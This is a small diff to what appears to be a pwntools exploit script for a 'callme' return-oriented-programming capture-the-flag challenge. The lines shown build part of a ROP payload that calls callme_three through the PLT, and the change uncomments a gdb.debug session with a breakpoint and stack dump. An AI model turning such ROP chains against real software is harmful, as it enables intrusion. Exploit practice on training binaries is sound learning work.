@@ -28,11 +28,11 @@ payload += p64(0xD00DF00DD00DF00D)
 payload += p64(elf.plt['callme_three'])
 
 io = process(challenge)
-# io = gdb.debug(challenge, gdbscript='''
-# 		br *0x4008F1
-# 		c
-# 		x/20x $sp
-# 		''')
+io = gdb.debug(challenge, gdbscript='''
+		br *0x4008F1
+		c
+		x/20x $sp
+		''')
 
 print(io.recvuntil(b'> '))
 
